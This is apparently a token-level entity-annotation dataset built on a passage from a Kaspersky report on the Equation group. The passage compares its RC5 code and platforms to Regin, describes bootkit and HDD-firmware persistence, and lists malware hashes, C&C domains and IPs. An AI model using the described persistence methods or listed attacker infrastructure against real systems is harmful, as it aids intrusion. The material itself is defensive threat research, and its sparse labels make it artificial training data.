constant O
usage O
is O
a O
bit O
different O
in O
the O
reference O
code O
. O

Inside O
the O
Equation O
group O
malware O
, O
the O
encryption O
library O
uses O
a O
subtract O
operation O
with O
the O
constant O
0x61C88647 O
. O

In O
most O
publicly O
available O
RC5/6 O
code O
, O
this O
constant O
is O
usually O
stored O
as O
0x9E3779B9 O
, O
which O
is O
basically O
-0x61C88647 O
. O

Since O
an O
addition O
is O
faster O
on O
certain O
hardware O
than O
a O
subtraction O
, O
it O
makes O
sense O
to O
store O
the O
constant O
in O
its O
negative O
form O
and O
adding O
it O
instead O
of O
subtracting O
. O

RC5 O
key O
setup O
reference O
document O
RFC2040 O
( O
https://tools.ietf.org/html/rfc2040 O
) O
Searching O
for O
" O
0x61C88647 O
0xB7E15163 O
" O
on O
Google O
results O
in O
barely O
two O
pages O
of O
results O
, O
indicating O
this O
combination O
of O
constants O
is O
relatively O
rare O
. O

Most O
of O
the O
hits O
are O
on O
Chinese O
forums O
. O

Searching O
for O
the O
2-inverse O
constant O
" O
0x9E3779B9 O
0xB7E15163 O
" O
results O
in O
a O
whopping O
2500 O
hits O
. O

Interestingly O
, O
Regin O
implements O
the O
same O
constants O
in O
its O
RC5 O
code O
. O

Here O
's O
how O
the O
RC5 O
key O
setup O
code O
looks O
in O
Regin O
. O

In O
total O
, O
we O
identified O
20 O
different O
compiled O
versions O
of O
the O
RC5/6 O
code O
in O
the O
Equation O
group O
malware O
. O

Although O
similar O
, O
the O
RC5 O
code O
is O
a O
bit O
different O
in O
Regin O
– O
none O
of O
the O
known O
Equation O
samples O
uses O
the O
" O
C7 O
41 O
10 O
" O
opcode O
for O
setting O
up O
the O
P O
constant O
, O
as O
Regin O
does O
. O

This O
suggests O
that O
the O
EQUATION O
group O
and O
the O
Regin O
group O
are O
two O
different O
entities O
. O

platforms O
compare O
with O
Regin O
? O
To O
attack O
their O
victims O
, O
the O
EQUATION O
group O
used O
several O
cyberespionage O
platforms O
over O
the O
last O
14 O
years O
. O

These O
include O
. O

With O
EQUATIONDRUG O
, O
we O
observed O
the O
use O
of O
virtual O
file O
systems O
, O
which O
is O
also O
one O
of O
the O
trademarks O
of O
the O
Regin O
group O
. O

This O
was O
taken O
to O
further O
extreme O
in O
GRAYFISH B-Entity
, O
which O
exclusively O
uses B-Action
the O
registry B-Entity
to B-Modifier
store O
all B-Entity
malware I-Entity
- I-Entity
related I-Entity
modules I-Entity
and I-Entity
data I-Entity
in I-Entity
encrypted I-Entity
format I-Entity
. O

The O
GRAYFISH O
registry O
- O
based O
architecture O
is O
more O
flexible O
, O
stealthy O
and O
more O
complex O
than O
Regin O
, O
for O
several O
reasons O
. O

In O
addition O
, O
we O
can O
compare O
the O
two O
platforms O
by O
their O
startup O
mechanisms O
. O

While O
64-bit O
Regin O
uses O
a O
service O
that O
loads O
the O
remaining O
of O
the O
code O
from O
the O
end O
of O
the O
last O
partition O
on O
disk O
and O
further O
from O
the O
VFSes O
, O
GRAYFISH O
takes O
this O
a O
step O
further O
. O

The O
GRAYFISH B-Entity
bootkit I-Entity
starts O
from O
the O
VBR O
, O
loads B-Action
the O
operating B-Entity
system I-Entity
and O
hijacks B-Action
the O
loading B-Entity
of I-Entity
the I-Entity
first I-Entity
driver I-Entity
in I-Entity
the I-Entity
kernel I-Entity
. O

Next O
, O
it O
loads O
all O
the O
other O
malware O
stages O
from O
the O
registry O
, O
making O
it O
almost O
completely O
invisible O
in O
terms O
of O
footprint O
. O

Finally O
, O
in O
terms O
of O
advanced O
features O
, O
GRAYFISH B-Entity
and O
EQUATIONDRUG B-Entity
include B-Action
perhaps O
the B-Entity
most I-Entity
sophisticated I-Entity
persistence I-Entity
mechanism I-Entity
we I-Entity
've I-Entity
ever I-Entity
seen I-Entity
: O
re O
- O
flashing O
the O
HDD O
firmware O
. O

Due O
to O
the O
complexity O
of O
this O
process O
and O
the O
knowledge O
and O
resources O
required O
to O
implement O
something O
like O
it O
, O
the O
mechanism O
appears O
to O
be O
out O
of O
the O
reach O
of O
most O
advanced O
threat O
groups O
in O
the O
world O
except O
the O
EQUATION O
group O
. O

These O
as O
well O
as O
other O
general O
observations O
lead O
us O
to O
conclude O
that O
the O
EQUATION O
group O
surpasses O
Regin O
in O
sophistication O
and O
resources O
. O

We O
discovered O
one O
of O
the O
first O
EQUATIONDRUG O
modules O
during O
our O
research O
into O
the O
Regin O
nation O
- O
state O
APT O
operation O
. O

Somewhere O
in O
the O
Middle O
East O
, O
there O
is O
a O
computer O
we O
are O
calling O
the O
" O
The O
Magnet O
of O
Threats O
" O
because O
in O
addition O
to O
Regin O
, O
it O
was O
also O
infected O
by O
Turla O
, O
ItaDuke O
, O
Animal O
Farm O
and O
Careto O
/ O
Mask O
. O

When O
we O
tried O
to O
analyze O
the O
Regin O
infection O
on O
this O
computer O
, O
we O
identified O
another O
module O
which O
did O
not O
appear O
to O
be O
part O
of O
the O
Regin O
infection O
, O
nor O
any O
of O
the O
other O
APTs O
. O

Further O
investigation O
into O
this O
module O
led O
us O
to O
the O
discovery O
of O
the O
EQUATIONDRUG O
platform O
. O

By O
looking O
for O
similarities O
using O
statistical O
analysis O
and O
correlation O
as O
well O
as O
C&C O
- O
based O
pivoting O
, O
we O
identified O
several O
other O
malware O
families O
: O
DOUBLEFANTASY O
, O
EQUATIONLASER O
and O
FANNY O
. O

Further O
research O
enabled O
us O
to O
find O
GRAYFISH O
and O
TRIPLEFANTASY O
. O

Another O
interesting O
detail O
is O
that O
several O
EQUATION O
group O
victims O
appear O
to O
have O
been O
previously O
infected O
by O
Regin O
and O
, O
in O
one O
case O
, O
had O
both O
Regin O
and O
EQUATIONDRUG O
. O

This O
makes O
us O
believe O
the O
two O
groups O
are O
different O
from O
each O
other O
. O

Indicators O
of O
compromise O
( O
" O
one O
of O
each O
" O
) O
Name O
EquationLaser O
MD5 O
752af597e6d9fd70396accc0b9013dbe O
Type O
EquationLaser O
installer O
Compiled O
Mon O
Oct O
18 O
15:24:05 O
2004 O
Name O
Disk O
from O
Houston O
" O
autorun.exe O
" O
with O
EoP O
exploits O
MD5 O
6fe6c03b938580ebf9b82f3b9cd4c4aa O
Type O
EoP O
package O
and O
malware O
launcher O
Compiled O
We O
d O
Dec O
23 O
15:37:33 O
2009 O
Name O
DoubleFantasy O
MD5 O
2a12630ff976ba0994143ca93fecd17f O
Type O
DoubleFantasy O
installer O
Compiled O
Fri O
Apr O
30 O
01:03:53 O
2010 O
Name O
EquationDrug O
MD5 O
4556ce5eb007af1de5bd3b457f0b216d O
Type O
EquationDrug O
installer O
( O
" O
LUTEUSOBSTOS O
" O
) O
Compiled O
Tue O
Dec O
11 O
20:47:12 O
2007 O
Name O
GrayFish O
MD5 O
9b1ca66aab784dc5f1dfe635d8f8a904 O
Type O
GrayFish O
installer O
Compiled O
Compiled O
: O
Fri O
Feb O
01 O
22:15:21 O
2008 O
( O
installer O
) O
Name O
Fanny O
MD5 O
0a209ac0de4ac033f31d6ba9191a8f7a O
Type O
Fanny O
worm O
Compiled O
Mon O
Jul O
28 O
11:11:35 O
2008 O
Name O
TripleFantasy O
MD5 O
9180d5affe1e5df0717d7385e7f54386 O
loader O
( O
17920 O
bytes O
.DLL O
) O
MD5 O
ba39212c5b58b97bfc9f5bc431170827 O
encrypted O
payload O
( O
.DAT O
) O
Compiled O
various O
, O
possibly O
fake O
Name O
_ O
SD_IP_CF.dll O
- O
unknown O
MD5 O
03718676311de33dd0b8f4f18cffd488 O
Type O
DoubleFantasy O
installer O
+ O
LNK O
exploit O
package O
Compiled O
Fri O
Feb O
13 O
10:50:23 O
2009 O
Name O
nls_933w.dll O
MD5 O
11fb08b9126cdb4668b3f5135cf7a6c5 O
Type O
HDD O
reprogramming O
module O
Compiled O
Tue O
Jun O
15 O
20:23:37 O
2010 O
Name O
standalonegrok_2.1.1.1 O
/ O
GROK O
MD5 O
24a6ec8ebf9c0867ed1c097f4a653b8d O
Type O
GROK O
keylogger O
Compiled O
Tue O
Aug O
09 O
03:26:22 O
2011 O
C&C O
servers O
( O
hostnames O
and O
IPs O
) O
: O
DoubleFantasy O
: O
advancing O
- O
technology[.]com O
avidnewssource[.]com O
businessdealsblog[.]com O
businessedgeadvance[.]com O
charging O
- O
technology[.]com O
computertechanalysis[.]com O
config.getmyip[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
globalnetworkanalys[.]com O
melding O
- O
technology[.]com O
myhousetechnews[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
newsterminalvelocity[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
selective O
- O
business[.]com O
slayinglance[.]com O
successful O
- O
marketing O
- O
now[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
taking O
- O
technology[.]com O
techasiamusicsvr[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
technicaldigitalreporting[.]com O
timelywebsitehostesses[.]com O
www.dt1blog[.]com O
www.forboringbusinesses[.]com O
EquationLaser O
: O
lsassoc[.]com O
- O
re O
- O
registered O
, O
not O
malicious O
at O
the O
moment O
gar O
- O
tech[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
Fanny O
: O
webuysupplystore.mooo[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
EquationDrug O
: O
newjunk4u[.]com O
easyadvertonline[.]com O
newip427.changeip[.]net O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
ad O
- O
servicestats[.]net O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
subad O
- O
server[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
ad O
- O
noise[.]net O
ad O
- O
void[.]com O
aynachatsrv[.]com O
damavandkuh[.]com O
fnlpic[.]com O
monster O
- O
ads[.]net O
nowruzbakher[.]com O
sherkhundi[.]com O
quik O
- O
serv[.]com O
nickleplatedads[.]com O
arabtechmessenger[.]net O
amazinggreentechshop[.]com O
foroushi[.]net O
technicserv[.]com O
goldadpremium[.]com O
honarkhaneh[.]net O
parskabab[.]com O
technicupdate[.]com O
technicads[.]com O
customerscreensavers[.]com O
darakht[.]com O
ghalibaft[.]com O
adservicestats[.]com O
247adbiz[.]net O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
webbizwild[.]com O
roshanavar[.]com O
afkarehroshan[.]com O
thesuperdeliciousnews[.]com O
adsbizsimple[.]com O
goodbizez[.]com O
meevehdar[.]com O
xlivehost[.]com O
gar O
- O
tech[.]com O
- O
SINKHOLED O
BY O
KASPERSKY O
LAB O
downloadmpplayer[.]com O
honarkhabar[.]com O
techsupportpwr[.]com O
webbizwild[.]com O
zhalehziba[.]com O
serv O
- O
load[.]com O
wangluoruanjian[.]com O
islamicmarketing[.]net O
noticiasftpsrv[.]com O
coffeehausblog[.]com O
platads[.]com O
havakhosh[.]com O
toofanshadid[.]com O
bazandegan[.]com O
sherkatkonandeh[.]com O
mashinkhabar[.]com O
quickupdateserv[.]com O
rapidlyserv[.]com O
GrayFish O
: O
ad O
- O
noise[.]net O
business O
- O
made O
- O
fun[.]com O
businessdirectnessource[.]com O
charmedno1[.]com O
cribdare2no[.]com O
dowelsobject[.]com O
following O
- O
technology[.]com O
forgotten O
- O
deals[.]com O
functional O
- O
business[.]com O
housedman[.]com O
industry O
- O
deals[.]com O
listennewsnetwork[.]com O
phoneysoap[.]com O
posed2shade[.]com O
quik O
- O
serv[.]com O
rehabretie[.]com O
speedynewsclips[.]com O
teatac4bath[.]com O
unite3tubes[.]com O
unwashedsound[.]com O
TripleFantasy O
: O
arm2pie[.]com O
brittlefilet[.]com O
cigape[.]net O
crisptic01[.]net O
fliteilex[.]com O
itemagic[.]net O
micraamber[.]net O
mimicrice[.]com O
rampagegramar[.]com O
rubi4edit[.]com O
rubiccrum[.]com O
rubriccrumb[.]com O
team4heat[.]net O
tropiccritics[.]com O
Equation O
group O
's O
exploitation O
servers O
: O
standardsandpraiserepurpose[.]com O
suddenplot[.]com O
technicalconsumerreports[.]com O
technology O
- O
revealed[.]com O
IPs O
hardcoded O
in O
malware O
configuration O
blocks O
: O
149.12.71.2 O
190.242.96.212 O
190.60.202.4 O
195.128.235.227 O
195.128.235.231 O
195.128.235.233 O
195.128.235.235 O
195.81.34.67 O
202.95.84.33 O
203.150.231.49 O
203.150.231.73 O
210.81.52.120 O
212.61.54.239 O
41.222.35.70 O
62.216.152.67 O
64.76.82.52 O
80.77.4.3 O
81.31.34.175 O
81.31.36.174 O
81.31.38.163 O
81.31.38.166 O
84.233.205.99 O
85.112.1.83 O
87.255.38.2 O
89.18.177.3 O
Kaspersky O
products O
detection O
names O
. O

Securelist O
, O
the O
resource O
Follow O
us O
for O
Kaspersky O
Lab O
experts O
' O
technical O
research O
, O
Academy O
Business O
Eugene O
SecureList O
ThreatPost O
Daily O
analysis O
, O
and O
thoughts O
. O

Academy O
Business O
Eugene O
ThreatPost O
Daily O
Kaspersky O
Lab O
global O
Website O
Eugene O
Kaspersky O
Blog O
Daily O
Business O
Daily O
Kaspersky O
Lab O
B2C O
Blog O
Kaspersky O
Lab O
B2B O
Blog O
Academy O
Business O
ThreatPost O
Daily O
Academy O
Business O
Daily O
Kaspersky O
Lab O
security O
news O
service O
Kaspersky O
Lab O
Academy O
TLP O
: O
White O
For O
any O
inquiries O
, O
please O
contact O
intelreports@kaspersky.com O
Kaspersky O
Lab O
HQ O
39A/3 O
Leningradskoe O
Shosse O
Moscow O
, O
125212 O
Russian O
Federation O
more O
contact O
details O
Tel O
: O
+ O
7 O
- O
495 O
- O
797 O
- O
8700 O
Fax O
: O
+ O
7 O
- O
495 O
- O
797 O
- O
8709 O

